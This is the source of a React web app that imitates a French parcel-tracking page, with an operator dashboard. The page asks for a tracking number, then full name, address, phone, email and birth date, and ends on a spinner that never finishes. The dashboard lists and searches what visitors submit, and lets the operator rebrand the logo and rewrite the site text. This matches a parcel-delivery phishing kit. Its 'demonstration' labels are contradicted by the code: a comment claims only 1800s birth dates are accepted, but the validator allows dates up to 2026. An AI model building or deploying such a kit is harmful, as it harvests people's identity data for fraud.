import React, { useEffect, useMemo, useState, type ChangeEvent, type FormEvent } from 'react';
import { createRoot } from 'react-dom/client';
import DOMPurify from 'dompurify';
import {
  ArrowLeft, ArrowRight, ChevronRight, CircleAlert, ClipboardList, House,
  LoaderCircle, LogOut, MapPin, Menu, Package, Search, Settings2,
  Trash2, Upload, X, RefreshCw, CalendarDays
} from 'lucide-react';
import { sb, edgeUrl, storageUrl, type SiteSettings, type Submission } from './supabase';
import './style.css';
import { SITE_COPY_ENTRIES, SITE_COPY_DEFAULTS } from './site-copy';
import { SITE_BUTTON_ENTRIES, LOCKED_BUTTON_KEYS } from './site-buttons';

// Ce projet est une reconstruction éditable de l'interface Vercel initiale.
// L'application n'est pas connectée à un transporteur ; ne pas la présenter comme telle.

const emptySettings: SiteSettings = { id: true, logo_path: null, logo_width: 180 };
const dateFR = (value: string) => new Date(value).toLocaleString('fr-FR', { dateStyle: 'medium', timeStyle: 'short' });
const validEmail = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
const validPhone = /^[+0-9().\s-]{8,20}$/;
const validBirthDate = (input: string) => {
  if (!/^\d{4}-\d{2}-\d{2}$/.test(input) || input < '1800-01-01' || input > '2026-11-01') return false;
  const value = new Date(`${input}T12:00:00`);
  return !Number.isNaN(value.getTime()) &&
    [value.getFullYear(), value.getMonth() + 1, value.getDate()].join('-') ===
    input.split('-').map(Number).join('-');
};

function App() {
  const [step, setStep] = useState<1|2|3>(() => location.pathname === '/admin' ? 1 : 1);
  const [tracking, setTracking] = useState('');
  const [postal, setPostal] = useState('');
  const [fullName, setFullName] = useState('');
  const [address, setAddress] = useState('');
  const [city, setCity] = useState('');
  const [phone, setPhone] = useState('');
  const [email, setEmail] = useState('');
  const [birthDate, setBirthDate] = useState('');
  const [consent, setConsent] = useState(false);
  const [errors, setErrors] = useState<Record<string,string>>({});
  const [pending, setPending] = useState(false);
  const [, setResult] = useState<{ id:string; delete_token:string }|null>(null);
  const [mainError, setMainError] = useState('');
  const [menuOpen, setMenuOpen] = useState(false);
  const [settings, setSettings] = useState<SiteSettings>(emptySettings);
  const [settingsLoaded, setSettingsLoaded] = useState(false);
  const [siteCopy, setSiteCopy] = useState<Record<string,string>>({});
  const [buttonPrefs, setButtonPrefs] = useState<Record<string,boolean>>({});
  const visible = (key:string) => LOCKED_BUTTON_KEYS.has(key) || buttonPrefs[key]!==false;
  const reloadButtons = async () => { const {data} = await sb.from('site_buttons').select('key,visible'); if (data) setButtonPrefs(Object.fromEntries(data.map(({key,visible})=>[key,visible]))); };
  const onButtonSaved = (key:string,value:boolean) => setButtonPrefs(prev=>({...prev,[key]:value}));
  const t = (key:string) => siteCopy[key] || SITE_COPY_DEFAULTS[key] || key;
  const reloadCopy = async () => { const {data} = await sb.from('site_copy').select('key,value'); if (data) setSiteCopy(Object.fromEntries(data.map(({key,value}) => [key,value]))); };
  const onCopySaved = (key:string, value:string) => setSiteCopy(prev=>({...prev,[key]:value}));
  const [adminRoute, setAdminRoute] = useState(location.pathname.startsWith('/admin'));

  const logoSrc = settings.logo_path ? storageUrl(settings.logo_path) : null;
  useEffect(() => {
    void reloadCopy();
    void reloadButtons();
    void sb.from('site_settings').select('id,logo_path,logo_width').eq('id', true).maybeSingle()
      .then(({data}) => { if (data) setSettings(data as SiteSettings); setSettingsLoaded(true); });
    const onPop = () => { setAdminRoute(location.pathname.startsWith('/admin')); setStep(1); };
    window.addEventListener('popstate', onPop);
    const onFocus = () => { void reloadCopy(); void reloadButtons(); };
    window.addEventListener('focus', onFocus);
    const refresh = window.setInterval(() => { void reloadCopy(); void reloadButtons(); }, 15000);
    return () => { window.clearInterval(refresh); window.removeEventListener('focus', onFocus); window.removeEventListener('popstate', onPop); };
  }, []);

  const go = (path: string) => {
    history.pushState(null,'',path);
    setAdminRoute(path.startsWith('/admin'));
    setMenuOpen(false);
    window.scrollTo(0,0);
    if (path === '/') setStep(1);
  };
  const clear = (field: string) => { setErrors(prev => ({ ...prev, [field]: '' })); setMainError(''); };

  function submitTracking(e: FormEvent) {
    e.preventDefault();
    const next: Record<string,string> = {};
    if (!/^[A-Za-z0-9_-]{5,32}$/.test(tracking.trim())) next.tracking = t("form.tracking.error");
    if (!/^\d{5}$/.test(postal.trim())) next.postal = t("form.tracking.postal.error");
    setErrors(next);
    if (Object.keys(next).length === 0) { setStep(2); window.scrollTo(0,0); }
  }
  async function submitInfo(e: FormEvent) {
    e.preventDefault();
    if (pending) return;
    const next: Record<string,string> = {};
    if (fullName.trim().length < 2 || fullName.trim().length > 100) next.fullName=t("form.details.error.name");
    if (address.trim().length < 5 || address.trim().length > 200) next.address=t("form.details.error.address");
    if (city.trim().length < 2 || city.trim().length > 100) next.city=t("form.details.error.city");
    if (!validPhone.test(phone.trim())) next.phone=t("form.details.error.phone");
    if (!validEmail.test(email.trim()) || email.trim().length > 200) next.email=t("form.details.error.email");
    // Cette démonstration accepte uniquement une date de test fictive (1800–1899).
    if (!validBirthDate(birthDate)) next.birthDate=t("form.details.error.birth");
    if (!consent) next.consent=t("form.details.error.consent");
    setErrors(next);
    if (Object.keys(next).length) return;
    setPending(true); setMainError('');
    try {
      const response = await fetch(edgeUrl, {
        method:'POST', headers: { 'Content-Type':'application/json' },
        body: JSON.stringify({
          kind:'submit', demo:true, consent:true, fictional_data:true,
          tracking_number:tracking.trim().toUpperCase(), postal_code:postal.trim(),
          full_name:fullName.trim(), address:address.trim(), city:city.trim(), phone:phone.trim(), email:email.trim().toLowerCase(),
          birth_date: birthDate
        })
      });
      const body: { id?:string; delete_token?:string; error?:string } = await response.json();
      if (!response.ok || !body.id || !body.delete_token) throw new Error(body.error || t("form.details.error.storage"));
      setResult({id:body.id,delete_token:body.delete_token});
      setStep(3); window.scrollTo(0,0);
    } catch(err) {
      setMainError(err instanceof Error ? err.message : t("form.details.error.network"));
    } finally { setPending(false); }
  }

  return <>
    <header className="site-header">
      <div className="header-left">
        {visible("nav.menu.open") && <button className="hamburger icon-button" onClick={() => setMenuOpen(!menuOpen)} aria-label={t("nav.menu.open")}><Menu size={25}/></button>}
        {visible("nav.search") && <button className="search-button icon-button" onClick={() => {go('/');window.setTimeout(()=>document.getElementById('tracking-number')?.focus(),30);}} aria-label={t("nav.search")}><Search size={27}/></button>}
      </div>
      {visible("nav.home.return") && <button className="brand" aria-label={t("nav.home.return")} onClick={()=>go('/')}>
        {logoSrc && <img style={{maxWidth:`${settings.logo_width}px`}} src={logoSrc} alt="Logo" />}
      </button>}
      <div className="header-right-spacer" aria-hidden="true" />
    </header>
    {menuOpen && <div className="menu-overlay">
      <button aria-label={t("nav.menu.close")} className="close-menu icon-button" onClick={()=>setMenuOpen(false)}><X/></button>
      {visible("nav.menu.home") && <button onClick={()=>go('/')}><House size={18}/> {t("nav.home")}</button>}
      
    </div>}

    {adminRoute ? <AdminPage key="admin" settings={settings} setSettings={setSettings} settingsLoaded={settingsLoaded} siteCopy={siteCopy} onCopySaved={onCopySaved} buttonPrefs={buttonPrefs} onButtonSaved={onButtonSaved} visible={visible} /> :
      <main className="public-main">
        {step===1 && <>
          <Breadcrumb current={t("nav.tracking")} onHome={()=>go('/')} homeLabel={t("nav.home")} ariaLabel={t("nav.breadcrumb")} showHome={visible("nav.breadcrumb.home")} />
          <div className="public-content">
            <h1>{t("form.tracking.title")}</h1>
            <div className="disclosure" role="note"><strong>Démonstration uniquement.</strong> Aucun colis réel n’est suivi. Utilisez exclusivement des informations fictives.</div>
            <form className="tracking-form" noValidate onSubmit={submitTracking}>
              <Field id="tracking-number" label={t("form.tracking.number.label")} value={tracking} onChange={v=>{setTracking(v);clear('tracking')}} placeholder={t("form.tracking.number.placeholder")} maxLength={32} error={errors.tracking} />
              <Field label={t("form.tracking.postal.label")} value={postal} onChange={v=>{setPostal(v);clear('postal')}} placeholder={t("form.tracking.postal.placeholder")} inputMode="numeric" maxLength={5} error={errors.postal}/>
              {visible("form.tracking.submit") && <button className="primary-button" type="submit">{t("form.tracking.submit")} <ArrowRight size={21}/></button>}
            </form>
          </div>
        </>}
        {step===2 && <>
          <Breadcrumb current={t("form.details.breadcrumb")} onHome={()=>go('/')} homeLabel={t("nav.home")} ariaLabel={t("nav.breadcrumb")} showHome={visible("nav.breadcrumb.home")} />
          <div className="public-content">
            {visible("form.details.back") && <button type="button" className="back-link" onClick={()=>{setStep(1);window.scrollTo(0,0)}}><ArrowLeft size={20}/> {t("form.details.back")}</button>}
            <h1>{t("form.details.title")}</h1>
            <div className="disclosure" role="note">{t("form.details.disclosure")}</div>
            <div className="summary-box"><Package size={21}/><span>{t("form.details.reference")} <strong>{tracking.toUpperCase()}</strong> · {postal}</span></div>
            <form className="details-form" noValidate onSubmit={submitInfo}>
              <Field label={t("form.details.name.label")} value={fullName} onChange={v=>{setFullName(v);clear('fullName')}} placeholder={t("form.details.name.placeholder")} error={errors.fullName}/>
              <Field label={t("form.details.address.label")} value={address} onChange={v=>{setAddress(v);clear('address')}} placeholder={t("form.details.address.placeholder")} error={errors.address}/>
              <Field label={t("form.details.city.label")} value={city} onChange={v=>{setCity(v);clear('city')}} placeholder={t("form.details.city.placeholder")} error={errors.city}/>
              <Field label={t("form.details.phone.label")} value={phone} onChange={v=>{setPhone(v);clear('phone')}} placeholder={t("form.details.phone.placeholder")} type="tel" inputMode="tel" error={errors.phone}/>
              <Field label={t("form.details.email.label")} value={email} onChange={v=>{setEmail(v);clear('email')}} placeholder={t("form.details.email.placeholder")} type="email" inputMode="email" error={errors.email}/>
              <label className="field-block"><span className="field-label">{t("form.details.birth.label")} <span className="required-star">*</span></span>
                <input type="date" min="1800-01-01" max="2026-11-01" value={birthDate} required onChange={e=>{setBirthDate(e.target.value);clear('birthDate')}}/>
                <small className="privacy-hint">{t("form.details.birth.note")}</small>
                {errors.birthDate && <span className="field-error">{errors.birthDate}</span>}
              </label>
              <label className="consent-row"><input type="checkbox" checked={consent} onChange={e=>{setConsent(e.target.checked);clear('consent')}}/>
                <span>{t("form.details.consent")}</span>
              </label>
              {errors.consent && <p className="field-error">{errors.consent}</p>}
              {mainError && <p role="alert" className="error-alert"><CircleAlert size={18}/>{mainError}</p>}
              {visible("form.details.submit") && <button type="submit" className="primary-button" disabled={pending}>{pending ? <LoaderCircle className="rotate" size={22}/> : null}{pending?t("form.details.pending"):t("form.details.submit")} {!pending&&<ArrowRight size={20}/>}</button>}
            </form>
          </div>
        </>}
        {step===3 && <div className="loading-page" aria-live="polite">
          <div className="spinner-ring"><LoaderCircle className="rotate" size={48}/></div>
          <h1>{t("form.loading.title")}</h1>
          <p className="screen-disclaimer">{t("form.loading.disclosure")}</p>
        </div>}
      </main>}
  </>;
}

function Breadcrumb({ current, onHome, homeLabel, ariaLabel, showHome }: {current:string;onHome:()=>void;homeLabel:string;ariaLabel:string;showHome:boolean}) {
  return <nav className="breadcrumb" aria-label={ariaLabel}><MapPin size={20}/>{showHome && <button onClick={onHome}>{homeLabel}</button>}<span className="slash">/</span><span className="current">{current}</span></nav>;
}

function Field({id,label,value,onChange,placeholder='',type='text',inputMode,maxLength,error}: {
  id?:string;label:string;value:string;onChange:(value:string)=>void;
  placeholder?:string;type?:string;inputMode?:React.HTMLAttributes<HTMLInputElement>['inputMode'];maxLength?:number;error?:string
}) {
  return <label className="field-block"><span className="field-label">{label}</span>
    <input id={id} type={type} inputMode={inputMode} maxLength={maxLength} value={value} onChange={e=>onChange(e.target.value)} placeholder={placeholder} required aria-invalid={Boolean(error)}/>
    {error && <span className="field-error">{error}</span>}
  </label>;
}

function AdminPage({settings,setSettings,settingsLoaded,siteCopy,onCopySaved,buttonPrefs,onButtonSaved,visible}:{settings:SiteSettings;setSettings:(v:SiteSettings)=>void;settingsLoaded:boolean;siteCopy:Record<string,string>;onCopySaved:(key:string,value:string)=>void;buttonPrefs:Record<string,boolean>;onButtonSaved:(key:string,value:boolean)=>void;visible:(key:string)=>boolean}){
  const t = (key:string) => siteCopy[key] || SITE_COPY_DEFAULTS[key] || key;
  const [authChecking,setAuthChecking]=useState(true);
  const [isAdmin,setIsAdmin]=useState(false);
  const [email,setEmail]=useState('');
  const [password,setPassword]=useState('');
  const [authError,setAuthError]=useState('');
  const [busy,setBusy]=useState(false);
  const [tab,setTab]=useState<'dashboard'|'settings'|'content'|'buttons'>('dashboard');
  const [rows,setRows]=useState<Submission[]>([]);
  const [loading,setLoading]=useState(false);
  const [search,setSearch]=useState('');
  const [page,setPage]=useState(1);
  const [detail,setDetail]=useState<Submission|null>(null);
  const [adminMsg,setAdminMsg]=useState('');
  const [uploadBusy,setUploadBusy]=useState(false);
  const [logoWidth,setLogoWidth]=useState(settings.logo_width);

  useEffect(()=>{setLogoWidth(settings.logo_width)},[settings.logo_width]);
  useEffect(()=>{
    let mounted=true;
    const check=async()=>{
      const {data:{user}}=await sb.auth.getUser();
      if(!user){if(mounted){setIsAdmin(false);setAuthChecking(false)};return;}
      const {data,error}=await sb.from('admin_users').select('user_id').eq('user_id',user.id).maybeSingle();
      if(mounted){setIsAdmin(Boolean(data)&&!error);setAuthChecking(false);}
    };
    void check();
    const {data: {subscription}}=sb.auth.onAuthStateChange(()=>{setTimeout(()=>void check(),0)});
    return ()=>{mounted=false;subscription.unsubscribe()};
  },[]);
  const reload=async()=>{
    setLoading(true);setAdminMsg('');
    const {data,error}=await sb.from('tracking_submissions').select('id,tracking_number,postal_code,full_name,address,city,phone,email,birth_date,created_at,status,consent_version').order('created_at',{ascending:false}).limit(1000);
    if(error) setAdminMsg('Chargement impossible : '+error.message);
    else setRows((data||[]) as Submission[]);
    setLoading(false);
  };
  useEffect(()=>{if(isAdmin)void reload()},[isAdmin]);
  const filtered=useMemo(()=>{
    const q=search.trim().toLowerCase();
    if(!q)return rows;
    return rows.filter(r=>[r.id,r.tracking_number,r.postal_code,r.full_name,r.address,r.city||'',r.phone,r.email,r.birth_date||''].some(v=>v.toLowerCase().includes(q)));
  },[rows,search]);
  const pages=Math.max(1,Math.ceil(filtered.length/12));
  const records=filtered.slice((Math.min(page,pages)-1)*12,Math.min(page,pages)*12);

  async function signIn(e:FormEvent){
    e.preventDefault();setBusy(true);setAuthError('');
    const {error}=await sb.auth.signInWithPassword({email:email.trim(),password});
    if(error)setAuthError(error.message);
    setBusy(false);
  }
  async function signOut(){await sb.auth.signOut();setIsAdmin(false)}
  async function removeRow(row:Submission){
    if(!confirm('Supprimer définitivement la soumission '+row.id+' ?'))return;
    const {error}=await sb.from('tracking_submissions').delete().eq('id',row.id);
    if(error){setAdminMsg(error.message);return}
    setDetail(null);await reload();
  }
  async function updateLogo(input:File){
    if(input.size>2*1024*1024){setAdminMsg('Le fichier doit peser moins de 2 Mo.');return}
    if(!['image/png','image/jpeg','image/webp','image/svg+xml'].includes(input.type)){setAdminMsg('Utilisez une image PNG, JPEG, WebP ou SVG.');return}
    setUploadBusy(true);setAdminMsg('');
    try{
      let data:Blob=input;
      if(input.type==='image/svg+xml'){
        const text=await input.text();
        const clean=DOMPurify.sanitize(text,{USE_PROFILES:{svg:true,svgFilters:true}});
        if(!clean.includes('<svg'))throw Error('Fichier SVG non valide.');
        data=new Blob([clean],{type:'image/svg+xml'});
      }
      const ext= input.type==='image/svg+xml'?'svg':input.type==='image/jpeg'?'jpg':input.type==='image/png'?'png':'webp';
      const path=`logos/${crypto.randomUUID()}.${ext}`;
      const {error:uploadError}=await sb.storage.from('site-logos').upload(path,data,{upsert:false,contentType:input.type,cacheControl:'3600'});
      if(uploadError)throw uploadError;
      const {data:updated,error}=await sb.from('site_settings').update({logo_path:path,logo_width:logoWidth,updated_at:new Date().toISOString()}).eq('id',true).select().single();
      if(error)throw error;
      setSettings(updated as SiteSettings);setAdminMsg('Logo enregistré.');
    }catch(err){setAdminMsg(err instanceof Error?err.message:'Erreur lors de l’envoi du logo.');}
    finally{setUploadBusy(false)}
  }
  async function saveWidth(){
    const width=Math.max(80,Math.min(340,logoWidth));
    const {data,error}=await sb.from('site_settings').update({logo_width:width,updated_at:new Date().toISOString()}).eq('id',true).select().single();
    if(error)setAdminMsg(error.message);else{setSettings(data as SiteSettings);setAdminMsg('Largeur sauvegardée.')}
  }
  async function removeLogo(){
    if(!confirm('Masquer le logo du site ?'))return;
    const {data,error}=await sb.from('site_settings').update({logo_path:null,updated_at:new Date().toISOString()}).eq('id',true).select().single();
    if(error)setAdminMsg(error.message);else{setSettings(data as SiteSettings);setAdminMsg('Logo supprimé de l’affichage.')}
  }

  if(authChecking)return <main className="admin-login"><LoaderCircle className="rotate" size={34}/><p>{t("admin.checking")}</p></main>;
  if(!isAdmin)return <main className="admin-login">
    <form onSubmit={signIn} className="login-card">
      <h1>{t("admin.login.title")}</h1><p>{t("admin.login.text")}</p>
      <Field label={t("admin.login.email.label")} value={email} onChange={setEmail} type="email" placeholder={t("admin.login.email.placeholder")} />
      <label className="field-block"><span className="field-label">{t("admin.login.password")}</span><input type="password" autoComplete="current-password" value={password} required onChange={e=>setPassword(e.target.value)}/></label>
      {authError&&<p className="field-error">{authError}</p>}
      <button className="primary-button" type="submit" disabled={busy}>{busy?t("admin.login.pending"):t("admin.login.submit")}</button>
      <p className="login-hint">{t("admin.login.hint")}</p>
    </form>
  </main>;
  return <main className="admin-shell">
    <aside className="admin-sidebar"><h2>{t("admin.sidebar.title")}</h2>
      <button className={tab==='dashboard'?'selected':''} onClick={()=>setTab('dashboard')}><ClipboardList size={18}/> {t("admin.sidebar.submissions")}</button>
      <button className={tab==='settings'?'selected':''} onClick={()=>setTab('settings')}><Settings2 size={18}/> {t("admin.sidebar.appearance")}</button>
      <button className={tab==='content'?'selected':''} onClick={()=>setTab('content')}><ClipboardList size={18}/> {t('admin.sidebar.content')}</button>
      <button className={tab==='buttons'?'selected':''} onClick={()=>setTab('buttons')}><Settings2 size={18}/> {t("admin.sidebar.buttons")}</button>
      <button className="signout" onClick={()=>void signOut()}><LogOut size={18}/> {t("admin.sidebar.signout")}</button>
    </aside>
    <div className="admin-workspace">
      {tab==='dashboard' ? <>
        <div className="admin-title"><div><span className="eyebrow">{t("admin.dashboard.eyebrow")}</span><h1>{t("admin.dashboard.title")}</h1></div>{visible("admin.dashboard.refresh") && <button className="outline-button" onClick={()=>void reload()}><RefreshCw size={17}/> {t("admin.dashboard.refresh")}</button>}</div>
        <div className="stats-grid"><div className="stat-card"><span>{t("admin.dashboard.total")}</span><strong>{rows.length}</strong></div><div className="stat-card"><span>{t("admin.dashboard.today")}</span><strong>{rows.filter(r=>new Date(r.created_at).toDateString()===new Date().toDateString()).length}</strong></div><div className="stat-card"><span>{t("admin.dashboard.results")}</span><strong>{filtered.length}</strong></div></div>
        <div className="admin-list">
          <label className="search-field"><Search size={19}/><input aria-label={t("nav.search")} placeholder={t("admin.dashboard.search.placeholder")} value={search} onChange={e=>{setSearch(e.target.value);setPage(1)}}/></label>
          <div className="table-scroll"><table><thead><tr><th>{t("admin.dashboard.column.date")}</th><th>{t("admin.dashboard.column.ref")}</th><th>{t("admin.dashboard.column.name")}</th><th>{t("admin.dashboard.column.email")}</th><th>{t("admin.dashboard.column.actions")}</th></tr></thead><tbody>
            {records.map(row=><tr key={row.id}><td>{dateFR(row.created_at)}</td><td className="mono">{row.tracking_number}</td><td>{row.full_name}</td><td>{row.email}</td><td className="row-actions"><button onClick={()=>setDetail(row)}>{t("admin.dashboard.details")} <ChevronRight size={16}/></button><button className="delete-row" aria-label={'Supprimer '+row.full_name} onClick={()=>void removeRow(row)}><Trash2 size={17}/></button></td></tr>)}
          </tbody></table>{!loading&&records.length===0&&<p className="empty-state">{t("admin.dashboard.empty")}</p>}{loading&&<p className="empty-state">{t("admin.dashboard.loading")}</p>}</div>
          <div className="pagination"><button disabled={page<=1} onClick={()=>setPage(p=>p-1)}>{t("admin.dashboard.previous")}</button><span>{t("admin.dashboard.page")} {Math.min(page,pages)} {t("admin.dashboard.of")} {pages}</span><button disabled={page>=pages} onClick={()=>setPage(p=>p+1)}>{t("admin.dashboard.next")}</button></div>
        </div>
      </> : tab==='content' ? <SiteCopyEditor siteCopy={siteCopy} onCopySaved={onCopySaved} /> : tab==='buttons' ? <SiteButtonsEditor buttonPrefs={buttonPrefs} onButtonSaved={onButtonSaved} /> : <>
        <div className="admin-title"><div><span className="eyebrow">{t("admin.appearance.eyebrow")}</span><h1>{t("admin.appearance.title")}</h1></div></div>
        <section className="settings-card"><h2>{t("admin.appearance.logo")}</h2>
          <p>{t("admin.appearance.logo.help")}</p>
          <div className="logo-preview">{settings.logo_path ? <img src={storageUrl(settings.logo_path)} style={{maxWidth:`${settings.logo_width}px`}} alt="Aperçu du logo"/> : <span>{t("admin.appearance.logo.empty")}</span>}</div>
          {visible("admin.appearance.logo.upload") && <label className="upload-button"><Upload size={18}/> {uploadBusy?t("admin.appearance.logo.uploading"):t("admin.appearance.logo.upload")}
            <input type="file" accept=".png,.jpg,.jpeg,.webp,.svg,image/png,image/jpeg,image/webp,image/svg+xml" disabled={uploadBusy} onChange={(e:ChangeEvent<HTMLInputElement>)=>{const f=e.target.files?.[0];if(f)void updateLogo(f);e.target.value=''}}/>
          </label>}
          <label className="width-setting">{t("admin.appearance.logo.width")} <strong>{logoWidth}px</strong><input type="range" min="80" max="340" step="10" value={logoWidth} onChange={e=>setLogoWidth(Number(e.target.value))}/></label>
          <div className="settings-actions">{visible("admin.appearance.save") && <button className="primary-button compact" disabled={!settingsLoaded} onClick={()=>void saveWidth()}>{t("admin.appearance.save")}</button>}{visible("admin.appearance.remove") && <button className="outline-button" onClick={()=>void removeLogo()}>{t("admin.appearance.remove")}</button>}</div>
        </section>
      </>}
      {adminMsg&&<p role="status" className="admin-message">{adminMsg}</p>}
    </div>
    {detail&&<div className="modal-backdrop" onClick={()=>setDetail(null)}><div className="detail-modal" role="dialog" aria-modal="true" aria-label="Détails de la soumission" onClick={e=>e.stopPropagation()}>
      <button className="close-modal" onClick={()=>setDetail(null)} aria-label={t("admin.detail.close")}><X/></button>
      <h2>{t("admin.detail.title")}</h2>
      <dl>{([
        [t('admin.detail.id'),detail.id],[t('admin.detail.date'),dateFR(detail.created_at)],[t('admin.detail.reference'),detail.tracking_number],[t('admin.detail.postal'),detail.postal_code],[t('admin.detail.name'),detail.full_name],[t('admin.detail.address'),detail.address],[t('admin.detail.city'),detail.city||'—'],[t('admin.detail.phone'),detail.phone],[t('admin.detail.email'),detail.email],['Date fictive de test',detail.birth_date?detail.birth_date.split('-').reverse().join('/'):'—']
      ] as [string,string][]).map(([key,value])=><React.Fragment key={key}><dt>{key}</dt><dd>{value}</dd></React.Fragment>)}</dl>
      <p className="detail-note"><CalendarDays size={16}/> {t("admin.detail.birth.note")}</p>
      <button className="danger-button" onClick={()=>void removeRow(detail)}><Trash2 size={17}/> {t("admin.detail.delete")}</button>
    </div></div>}
  </main>;
}


function SiteButtonsEditor({buttonPrefs,onButtonSaved}:{buttonPrefs:Record<string,boolean>;onButtonSaved:(key:string,value:boolean)=>void}){
  const [search,setSearch]=useState('');
  const [section,setSection]=useState('Toutes les pages');
  const [saving,setSaving]=useState<string|null>(null);
  const [message,setMessage]=useState('');
  const sections=['Toutes les pages',...Array.from(new Set(SITE_BUTTON_ENTRIES.map(item=>item.section)))];
  const entries=SITE_BUTTON_ENTRIES.filter(item=>(section==='Toutes les pages'||section===item.section) && `${item.key} ${item.label}`.toLowerCase().includes(search.toLowerCase()));
  const save=async(key:string,next:boolean)=>{
    const item=SITE_BUTTON_ENTRIES.find(x=>x.key===key);
    if(!item||item.locked)return;
    setSaving(key);setMessage('');
    const {error}=await sb.from('site_buttons').upsert({key,visible:next,updated_at:new Date().toISOString()},{onConflict:'key'});
    if(error){setMessage('Modification non enregistrée : '+error.message)}
    else{onButtonSaved(key,next);setMessage('Modification publiée. Les autres pages se synchronisent automatiquement.');}
    setSaving(null);
  };
  return <section className="site-buttons-editor">
    <div className="admin-title"><div><span className="eyebrow">INTERFACE</span><h1>Gestion des boutons</h1></div></div>
    <p className="copy-help">Tous les boutons sont recensés ici, y compris ceux de l'administration. Tu peux afficher ou masquer les boutons facultatifs. Les commandes nécessaires à la sécurité, à la suppression des données et à la gestion de l'administration restent visibles. Leur libellé peut être modifié depuis l'éditeur de textes.</p>
    <div className="copy-toolbar"><label>Page<select value={section} onChange={e=>setSection(e.target.value)}>{sections.map(x=><option key={x}>{x}</option>)}</select></label><label>Chercher un bouton<input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Nom, identifiant, page"/></label></div>
    <p className="copy-count">{entries.length} boutons affichés dans la liste. {entries.filter(x=>x.locked).length} commandes essentielles protégées.</p>
    <div className="copy-entries">{entries.map(item=> <article className="copy-entry" key={item.key}>
      <div className="copy-entry-head"><span>{item.section}</span><code>{item.key}</code></div>
      <h3 className="button-entry-label">{item.label}</h3>
      {item.locked ? <p className="copy-protected">Commande essentielle — affichage obligatoire.</p> : <label className="button-toggle"><input type="checkbox" checked={buttonPrefs[item.key]!==false} disabled={saving!==null} onChange={e=>void save(item.key,e.target.checked)}/><span>{buttonPrefs[item.key]===false?'Masqué sur le site':'Visible sur le site'}</span></label>}
      <p className="button-entry-hint">{item.locked?'Pour éviter une perte d’accès ou de droits.':'Enregistrement immédiat, sans redéploiement.'}</p>
    </article>)}</div>
    {message && <p className="admin-message" role="status">{message}</p>}
  </section>;
}

function SiteCopyEditor({siteCopy,onCopySaved}:{siteCopy:Record<string,string>;onCopySaved:(key:string,value:string)=>void}){
  const [section,setSection]=useState('Toutes les pages');
  const [search,setSearch]=useState('');
  const [drafts,setDrafts]=useState<Record<string,string>>({});
  const [saving,setSaving]=useState<string|null>(null);
  const [error,setError]=useState('');
  const [feedback,setFeedback]=useState('');
  const sections=['Toutes les pages',...Array.from(new Set(SITE_COPY_ENTRIES.map(x=>x.section)))];
  const entries=SITE_COPY_ENTRIES.filter(e=>(section==='Toutes les pages'||e.section===section) && (`${e.defaultValue} ${e.key}`.toLowerCase().includes(search.toLowerCase())));
  async function save(key:string, defaultValue:string){
    const item=SITE_COPY_ENTRIES.find(e=>e.key===key);
    if(!item || item.locked)return;
    const next=(drafts[key]??siteCopy[key]??defaultValue).trim();
    if(!next || next.length>800){setError('Texte obligatoire, 800 caractères maximum.');return;}
    setSaving(key);setError('');setFeedback('');
    const {error}=await sb.from('site_copy').upsert({key,value:next,updated_at:new Date().toISOString()},{onConflict:'key'});
    if(error)setError(error.message);
    else{onCopySaved(key,next);setFeedback('Texte publié sur le site.');setDrafts(prev=>{const updated={...prev};delete updated[key];return updated;});}
    setSaving(null);
  }
  return <section className="site-copy-editor">
    <div className="admin-title"><div><span className="eyebrow">CONTENUS</span><h1>Éditeur de textes</h1></div></div>
    <p className="copy-help">Tous les libellés de l’interface sont regroupés par page. Modifie le contenu puis clique sur « Publier ». L’aperçu se met à jour pendant la saisie et les textes publiés apparaissent sans nouveau déploiement.</p>
    <div className="copy-toolbar"><label>Page ou catégorie<select value={section} onChange={e=>setSection(e.target.value)}>{sections.map(s=><option key={s}>{s}</option>)}</select></label><label>Rechercher un texte<input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Chercher un titre, bouton, erreur…"/></label></div>
    <p className="copy-count">{entries.length} textes trouvés, dont {entries.filter(e=>e.locked).length} mentions protégées.</p>
    <div className="copy-entries">{entries.map(item=>{
      const live=siteCopy[item.key]??item.defaultValue;
      const text=drafts[item.key]??live;
      return <article className="copy-entry" key={item.key}>
        <div className="copy-entry-head"><span>{item.section}</span><code>{item.key}</code></div>
        {item.locked ? <><p className="copy-protected">Mention essentielle protégée pour informer correctement les utilisateurs.</p><p className="copy-preview">{live}</p></> : <>
          <textarea aria-label={`Modifier ${item.key}`} rows={Math.min(4,Math.max(2,Math.ceil(text.length/65)))} value={text} maxLength={800} onChange={e=>setDrafts(prev=>({...prev,[item.key]:e.target.value}))}/>
          <p className="copy-preview"><strong>Aperçu :</strong> {text}</p>
          <div className="copy-buttons"><button type="button" className="primary-button compact" disabled={saving!==null||!text.trim()||text===live} onClick={()=>void save(item.key,item.defaultValue)}>{saving===item.key?'Publication…':'Publier'}</button><button type="button" className="outline-button" disabled={saving!==null} onClick={()=>setDrafts(prev=>({...prev,[item.key]:item.defaultValue}))}>Texte d’origine</button></div>
        </>}
      </article>;
    })}</div>
    {error&&<p role="alert" className="admin-message">{error}</p>}{feedback&&<p role="status" className="admin-message">{feedback}</p>}
  </section>;
}

createRoot(document.getElementById('root')!).render(<React.StrictMode><App/></React.StrictMode>);
